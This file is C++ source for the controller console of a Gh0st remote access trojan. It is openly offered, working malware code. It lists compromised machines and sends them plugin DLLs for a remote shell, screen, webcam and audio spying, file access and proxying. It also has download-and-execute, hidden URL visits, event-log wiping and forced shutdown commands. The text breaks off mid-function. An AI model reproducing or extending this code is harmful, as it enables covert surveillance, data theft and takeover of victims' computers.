#include "stdafx.h"
#include "gh0st.h"
#include "gh0stDoc.h"
#include "gh0stView.h"
#include "MainFrm.h"
#include "MyFileManagerDlg.h"
#include "MyScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "InputDlg.h"
#include "SettingDlg.h"
#include "ProxyDlg.h"
#include <winsock2.h>
#include <Shlwapi.h>
#pragma comment(lib,"shlwapi.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern Cgh0stView* g_pConnectView;
extern CMainFrame* g_pFrame;
#define WM_MYINITIALUPDATE (WM_USER + 101)

typedef struct _COL
{
	TCHAR	*title;
	int		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[] =
{
	{ _T("上线IP"), 140 },
	{ _T("计算机名"), 140 },
	{ _T("操作系统"), 140 },
	{ _T("CPU"), 90 },
	{ _T("Ping"), 50 },
	{ _T("Cam"), 50 },
	{ _T("备注"), 50 },
	{ _T("区域"), 190 },
	{ _T("筛选"), 50 }
};

int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 8) - !((Cgh0stApp *)AfxGetApp())->m_bIsQQwryExist;

/////////////////////////////////////////////////////////////////////////////
// Cgh0stView

IMPLEMENT_DYNCREATE(Cgh0stView, CListView)

BEGIN_MESSAGE_MAP(Cgh0stView, CListView)
	//{{AFX_MSG_MAP(Cgh0stView)
	ON_WM_SIZE()
	ON_WM_RBUTTONDOWN()
	ON_COMMAND(IDM_DOWNEXEC, OnDownexec)
	ON_COMMAND(IDM_REMOVE, OnRemove)
	ON_COMMAND(IDM_LOGOFF, OnLogoff)
	ON_COMMAND(IDM_REBOOT, OnReboot)
	ON_COMMAND(IDM_SHUTDOWN, OnShutdown)
	ON_COMMAND(IDM_SELECT_ALL, OnSelectAll)
	ON_COMMAND(IDM_UNSELECT_ALL, OnUnselectAll)
	ON_COMMAND(IDM_OPEN_URL_HIDE, OnOpenUrlHide)
	ON_COMMAND(IDM_OPEN_URL_SHOW, OnOpenUrlShow)
	ON_COMMAND(IDM_CLEANEVENT, OnCleanevent)
	ON_COMMAND(IDM_RENAME_REMARK, OnRenameRemark)
	ON_COMMAND(IDM_UPDATE_SERVER, OnUpdateServer)
	ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
	ON_COMMAND(IDM_DISCONNECT, OnDisconnect)
	ON_COMMAND(IDM_PROXY, OnProxy)

	ON_COMMAND(IDM_OPEN3389, OnOpen3389)
	ON_COMMAND(IDM_SORT_PROCESS, OnSortProcess)
	ON_COMMAND(IDM_SORT_WINDOW, OnSortWindow)

	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)

	ON_MESSAGE(WM_MODIFYLIST, OnModifyList)
	ON_MESSAGE(WM_NOMODIFYLIST, OnNoModifyList)

	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_MYINITIALUPDATE, OnMyInitialUpdate)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENMyScreenSpyDIALOG, OnOpenMyScreenSpyDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENPROXYDIALOG, OnOpenProxyDialog)

	ON_COMMAND(IDC_SCREEN, OnScreen)
	ON_COMMAND(IDC_SHELL, OnCmdShell)
	ON_COMMAND(IDC_WEBCAM, OnWebcam)
	ON_COMMAND(IDC_MANAGE, OnManage)
	ON_COMMAND(IDC_KEYLOGGER, OnKeylogger)
	ON_COMMAND(IDC_Folder, OnFolder)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// Cgh0stView construction/destruction

int WINAPI loadData();
int WINAPI UnloadData();

Cgh0stView::Cgh0stView()
{
	m_iocpServer = NULL;
	m_nCount = 0;

	if (((Cgh0stApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}

	((Cgh0stApp *)AfxGetApp())->m_pConnectView = this;
	m_pListCtrl = NULL;

	loadData();
}

Cgh0stView::~Cgh0stView()
{
	UnloadData();
}

BOOL Cgh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}

/////////////////////////////////////////////////////////////////////////////
// Cgh0stView drawing

void Cgh0stView::OnDraw(CDC* pDC)
{
	Cgh0stDoc* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}

void Cgh0stView::SetColumnNumeric(int iCol)
{
	m_NumericColumns.Add(iCol);
}

void Cgh0stView::OnInitialUpdate()
{
	CListView::OnInitialUpdate();

	NONCLIENTMETRICS ncm;
	memset(&ncm, 0, sizeof(NONCLIENTMETRICS));
	ncm.cbSize = sizeof(NONCLIENTMETRICS);

	SystemParametersInfo(SPI_GETNONCLIENTMETRICS, sizeof(NONCLIENTMETRICS), &ncm, 0);

	ncm.lfMessageFont.lfWeight = 540;

	//m_headerCtrl.m_HeaderFont.CreateFontIndirect(&ncm.lfMessageFont);
	//SetFont(&(m_headerCtrl.m_HeaderFont));

	m_pListCtrl = &GetListCtrl();

	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(m_pListCtrl->m_hWnd, hImageListSmall, LVSIL_SMALL);

	m_pListCtrl->SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT |
		LVS_EX_HEADERDRAGDROP |
		LVS_EX_ONECLICKACTIVATE |
		LVS_EX_GRIDLINES);

	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
		m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
	}

	// 设置数据段
	SetColumnNumeric(0);
	SetColumnNumeric(6);
	PostMessage(WM_MYINITIALUPDATE);
}

/////////////////////////////////////////////////////////////////////////////
// Cgh0stView diagnostics

#ifdef _DEBUG
void Cgh0stView::AssertValid() const
{
	CListView::AssertValid();
}

void Cgh0stView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}

Cgh0stDoc* Cgh0stView::GetDocument() // non-debug version is inline
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(Cgh0stDoc)));
	return (Cgh0stDoc*)m_pDocument;
}
#endif
/////////////////////////////////////////////////////////////////////////////
// Cgh0stView message handlers

LRESULT Cgh0stView::OnMyInitialUpdate(WPARAM, LPARAM)
{
	Cgh0stView* pView = this;

	// Add Connects Window
	//((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Connections", this, "Connections Users");

	return 0;
}

LRESULT Cgh0stView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CMyFileManagerDlg *dlg = new CMyFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = MyFileManager_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

LRESULT Cgh0stView::OnOpenMyScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CMyScreenSpyDlg	*dlg = new CMyScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_MyScreenSpy, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = MyScreenSpy_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT Cgh0stView::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg *dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT Cgh0stView::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg *dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT Cgh0stView::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CKeyBoardDlg *dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT Cgh0stView::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CSystemDlg *dlg = new CSystemDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT Cgh0stView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CShellDlg *dlg = new CShellDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT Cgh0stView::OnOpenProxyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CProxyDlg	*dlg = new CProxyDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_SOCKS, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = PROXY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

TCHAR szPath[256];

int __stdcall ReadData(TCHAR szFile[], char **data)
{
	HANDLE hFile;
	TCHAR FileName[256];

	wsprintf(FileName, _T("%s\\%s"), szPath, szFile);

	hFile = CreateFile(FileName,
		GENERIC_ALL,
		FILE_SHARE_READ,
		(LPSECURITY_ATTRIBUTES)NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD dwSize = GetFileSize(hFile, NULL);

		*data = (CHAR *)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		ReadFile(hFile, *data, dwSize, &dwSize, NULL);

		CloseHandle(hFile);

		return dwSize;
	}

	MsgErr(_T("Read %s Error"), FileName);

	return 0;
}

int CmdPluginSize, FilePluginSize, SystemPluginSize, ScreenPluginSize, VideoPluginSize, AudioPluginSize, ProxyPluginSize;

PCHAR CmdPluginBuf, FilePluginBuf, SystemPluginBuf, ScreenPluginBuf, VideoPluginBuf, AudioPluginBuf, ProxyPluginBuf;

int WINAPI loadData()
{
	GetModuleFileName(GetModuleHandle(NULL), szPath, 256);

	for (int i = lstrlen(szPath); i > 0; i--)
	{
		if (szPath[i] == '\\')
		{
			szPath[i] = '\0';
			break;
		}
	}

	SetCurrentDirectory(szPath);

	CmdPluginSize = ReadData(_T("Plugins\\Cmd.dll"), &CmdPluginBuf);
	FilePluginSize = ReadData(_T("Plugins\\File.dll"), &FilePluginBuf);
	SystemPluginSize = ReadData(_T("Plugins\\System.dll"), &SystemPluginBuf);
	ScreenPluginSize = ReadData(_T("Plugins\\Screen.dll"), &ScreenPluginBuf);
	VideoPluginSize = ReadData(_T("Plugins\\video.dll"), &VideoPluginBuf);
	AudioPluginSize = ReadData(_T("Plugins\\Audio.dll"), &AudioPluginBuf);
	ProxyPluginSize = ReadData(_T("Plugins\\Proxy.dll"), &ProxyPluginBuf);

	return 0;
}

int WINAPI UnloadData()
{
	VirtualFree(CmdPluginBuf, CmdPluginSize, MEM_RELEASE);
	VirtualFree(VideoPluginBuf, VideoPluginSize, MEM_RELEASE);
	VirtualFree(SystemPluginBuf, SystemPluginSize, MEM_RELEASE);
	VirtualFree(ScreenPluginBuf, ScreenPluginSize, MEM_RELEASE);
	VirtualFree(AudioPluginBuf, AudioPluginSize, MEM_RELEASE);
	VirtualFree(ProxyPluginBuf, ProxyPluginSize, MEM_RELEASE);
	VirtualFree(FilePluginBuf, FilePluginSize, MEM_RELEASE);

	return 0;
}

void Cgh0stView::OnCmdShell()
{
	int nPacketLength = CmdPluginSize * sizeof(char) + 1;
	LPBYTE lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SHELL;
	memcpy(lpPacket + 1, (void*)CmdPluginBuf, nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;
}

void Cgh0stView::OnScreen()
{
	//	BYTE bToken = COMMAND_SCREEN_SPY;
	//	SendSelectCommand(&bToken, sizeof(BYTE));

	int nPacketLength = ScreenPluginSize * sizeof(char) + 1;
	LPBYTE lpPacket = (LPBYTE)VirtualAlloc(nPacketLength);
	lpPacket[0] = COMMAND_SCREEN_SPY;
	memcpy(lpPacket + 1, (void*)ScreenPluginBuf, nPacketLength - 1);
	SendSelectCommand(lpPacket, nPacketLength);
	VirtualFree((LPVOID)lpPacket, nPacketLength);
}

void Cgh0stView::OnWebcam()
{
	int nPacketLength = VideoPluginSize * sizeof(char) + 1;
	LPBYTE lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_WEBCAM;
	memcpy(lpPacket + 1, (void*)VideoPluginBuf, nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;
}

void Cgh0stView::OnKeylogger()
{
	// 	int nPacketLength = KeylogPluginSize * sizeof(char) + 1;
	// 	LPBYTE	lpPacket = new BYTE[nPacketLength];
	// 	lpPacket[0] = COMMAND_KEYBOARD;
	// 	memcpy(lpPacket + 1, (void*)KeylogPluginBuf, nPacketLength - 1);
	// 
	// 	SendSelectCommand(lpPacket, nPacketLength);
	// 	delete[] lpPacket;
}

void Cgh0stView::OnManage()
{
	int nPacketLength = SystemPluginSize * sizeof(char) + 1;
	LPBYTE lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SYSTEM;
	memcpy(lpPacket + 1, (void*)SystemPluginBuf, nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;
}

void Cgh0stView::OnFolder()
{
	int nPacketLength = FilePluginSize * sizeof(char) + 1;
	LPBYTE lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_LIST_DRIVE;
	memcpy(lpPacket + 1, (void*)FilePluginBuf, nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;
}

void Cgh0stView::OnProxy()
{
	int nPacketLength = ProxyPluginSize * sizeof(char) + 1;
	LPBYTE lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_PROXY;
	memcpy(lpPacket + 1, (void*)ProxyPluginBuf, nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;
}

void Cgh0stView::OnAudioListen()
{
	int nPacketLength = AudioPluginSize * sizeof(char) + 1;
	LPBYTE lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_AUDIO;
	memcpy(lpPacket + 1, (void*)AudioPluginBuf, nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;
}

void Cgh0stView::OnSize(UINT nType, int cx, int cy)
{
	CListView::OnSize(nType, cx, cy);

	// OnSize 的时候m_pListCtrl还没有初始化
	if (m_pListCtrl == NULL)
		return;

	CRect rcClient;
	GetClientRect(rcClient);

	int	nClientWidth = rcClient.Width();
	int nIndex = g_Column_Count - 1;

	if (nClientWidth < g_Column_Width)
		return;

	m_pListCtrl->SetColumnWidth(nIndex, nClientWidth - g_Column_Width + g_Column_Data[nIndex].nWidth);
}

void Cgh0stView::OnRButtonDown(UINT nFlags, CPoint point)
{
	CListView::OnRButtonDown(nFlags, point);

	CMenu popup;
	popup.LoadMenu(IDR_LIST);
	CMenu* pM = popup.GetSubMenu(0);
	CPoint p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	if (m_pListCtrl->GetSelectedCount() == 0)
	{
		for (int i = 0; i < count - 2; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
		pM->EnableMenuItem(count - 1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	}

	// 全选
	if (m_pListCtrl->GetItemCount() > 0)
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_ENABLED);
	else
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
}

LRESULT Cgh0stView::OnModifyList(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return 0;
	// 删除链表过程中可能会删除Context
	try
	{
		int nCnt = m_pListCtrl->GetItemCount();
		for (int i = 0; i < nCnt; i++)
		{
			if (pContext == (ClientContext *)m_pListCtrl->GetItemData(i))
			{
				m_pListCtrl->SetItemText(i, 8, _T("Found"));
				break;
			}
		}
	}
	catch (...)
	{
		MsgErr("Modify List");
	}

	return 0;
}

LRESULT Cgh0stView::OnNoModifyList(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return 0;
	// 删除链表过程中可能会删除Context
	try
	{
		int nCnt = m_pListCtrl->GetItemCount();
		for (int i = 0; i < nCnt; i++)
		{
			if (pContext == (ClientContext *)m_pListCtrl->GetItemData(i))
			{
				m_pListCtrl->SetItemText(i, 8, _T("--"));
				break;
			}
		}
	}
	catch (...)
	{
		MsgErr("No-Modify");
	}

	return 0;
}

LRESULT Cgh0stView::OnAddToList(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;

	if (pContext == NULL)
		return -1;

	CString	strToolTipsText, strOS;

	try
	{
		int nCnt = m_pListCtrl->GetItemCount();

		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();

		// ID
		CString	str;
		str.Format(_T("%d"), m_nCount++);

		// IP地址
		int i = m_pListCtrl->InsertItem(nCnt, str, 15);

		// 外网IP

		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		m_pListCtrl->SetItemText(i, 0, IPAddress);

		// 主机名
		m_pListCtrl->SetItemText(i, 1, LoginInfo->HostName);

		TCHAR *pszOS = NULL;
		if (LoginInfo->OsVerInfoEx.dwPlatformId == VER_PLATFORM_WIN32_NT)
		{
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4)
				pszOS = _T("NT");
			else if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0)
				pszOS = _T("2000");
			else if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1)
				pszOS = _T("XP");
			else if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2)
				pszOS = _T("2003");
			else if (LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0)
				pszOS = _T("Vista/2008");
			else if (LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1)
				pszOS = _T("Win7/2008R2");
			else if (LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2)
				pszOS = _T("Windows 8");
			else if (LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3)
				pszOS = _T("Windows 8.1");
			else if (LoginInfo->OsVerInfoEx.dwMajorVersion == 10)
				pszOS = _T("Windows 10");
			else
				pszOS = _T("Windows Unknown");

			strOS.Format(_T("%s SP%d (Build %d)"),
				pszOS,
				LoginInfo->OsVerInfoEx.wServicePackMajor,
				LoginInfo->OsVerInfoEx.dwBuildNumber
				);
		}
		else
		{
			strOS = "Unknown";
		}

		m_pListCtrl->SetItemText(i, 2, strOS);

		// CPU
		str.Format(_T("%dMHz"), LoginInfo->CPUClockMhz);
		m_pListCtrl->SetItemText(i, 3, str);

		// Speed
		str.Format(_T("%d"), LoginInfo->dwSpeed);
		m_pListCtrl->SetItemText(i, 4, str);

		//  camera
		str = LoginInfo->bIsWebCam ? _T("有") : _T("--");
		m_pListCtrl->SetItemText(i, 5, str);

		//备注
		m_pListCtrl->SetItemText(i, 6, LoginInfo->HostReMark);

		strToolTipsText.Format(_T("New Connection Information:\nHost: %s\nIP  : %s\nOS  : %s"), LoginInfo->HostName, IPAddress, strOS);

		if (((Cgh0stApp *)AfxGetApp())->m_bIsQQwryExist)
		{
			str = m_QQwry->IPtoAdd(IPAddress);
			m_pListCtrl->SetItemText(i, 7, str);

			strToolTipsText += "\nArea: ";
			strToolTipsText += str;
		}
		// 指定唯一标识
		m_pListCtrl->SetItemData(i, (DWORD)pContext);

		g_pFrame->ShowConnectionsNumber();

		if (!((Cgh0stApp *)AfxGetApp())->m_bIsDisablePopTips)
			g_pFrame->ShowToolTips(strToolTipsText);
	}
	catch (...)
	{
		MsgErr("AddToList");
	}

	return 0;
}

LRESULT Cgh0stView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	// 删除链表过程中可能会删除Context
	try
	{
		int nCnt = m_pListCtrl->GetItemCount();
		for (int i = 0; i < nCnt; i++)
		{
			if (pContext == (ClientContext *)m_pListCtrl->GetItemData(i))
			{
				m_pListCtrl->DeleteItem(i);
				break;
			}
		}

		// 关闭相关窗口

		switch (pContext->m_Dialog[0])
		{
		case MyFileManager_DLG:
		case MyScreenSpy_DLG:
		case WEBCAM_DLG:
		case AUDIO_DLG:
		case KEYBOARD_DLG:
		case SYSTEM_DLG:
		case SHELL_DLG:
		case PROXY_DLG:
			((CDialogEx*)pContext->m_Dialog[1])->DestroyWindow();
			break;
		default:
			break;
		}
	}
	catch (...)
	{
		MsgErr("RemoveFromList");
	}

	// 更新当前连接总数
	g_pFrame->ShowConnectionsNumber();
	return 0;
}

void Cgh0stView::SendSelectCommand(PBYTE pData, UINT nSize)
{
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		// 发送获得驱动器列表数据包
		m_iocpServer->Send(pContext, pData, nSize);

		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt
}

void Cgh0stView::OnDownexec()
{
	CInputDialog dlg;
	dlg.Init(_T("下载者"), _T("请输入要下载文件的地址:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();

	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		//MessageBox(_T("输入的网址不合法"), _T("错误"));
		//return;
	}

	int nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR) + 1;
	LPBYTE lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}

void Cgh0stView::OnRemove()
{
	// TODO: Add your command handler code here
	if (MessageBox(_T("确认卸载服务端?"), _T("Warning"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;

	BYTE bToken = COMMAND_REMOVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void Cgh0stView::RemoveHost()
{
	OnRemove();
}

void Cgh0stView::OnLogoff()
{
	// TODO: Add your command handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

void Cgh0stView::OnReboot()
{
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

void Cgh0stView::OnShutdown()
{
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

void Cgh0stView::OnSelectAll()
{
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)
	{
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
	}
}

void Cgh0stView::OnUnselectAll()
{
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)
	{
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);
	}
}

void Cgh0stView::OnOpenUrlHide()
{
	CInputDialog dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要隐藏访问的网址:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();

	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		//MessageBox(_T("输入的网址不合法"), _T("错误"));
		//return;
	}

	int nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR) + 1;
	LPBYTE lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}

void Cgh0stView::OnOpenUrlShow()
{
	CInputDialog dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要显示访问的网址:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find(_T("http://")) == -1)
	{
		MessageBox(_T("输入的网址不合法"), _T("错误"));
		return;
	}

	int nPacketLength = (dlg.m_str.GetLength() + 1)*sizeof(TCHAR) + 1;
	LPBYTE lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, (TCHAR*)dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}

void Cgh0stView::OnCleanevent()
{
	BYTE bToken = COMMAND_CLEAN_EVENT;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void Cgh0stView::OnRenameRemark()
{
	CString strTitle;
	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format(_T("更改主机(%s)的备注"), m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 2));
	else
		strTitle = _T("批量更改主机备注");
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength() == 0)
		return;

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength*sizeof(TCHAR)];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), (nPacketLength - 1)*sizeof(TCHAR));

	SendSelectCommand(lpPacket, nPacketLength*sizeof(TCHAR));

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while (pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		m_pListCtrl->SetItemText(nItem, 6, dlg.m_str);
	}

	delete[] lpPacket;
}

void Cgh0stView::OnUpdateServer()
{
	CInputDialog dlg;
	dlg.Init(_T("下载更新服务端"), _T("请输入要下载新服务端的地址:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();

	if (dlg.m_str.Find(_T("http://")) == -1)
	{
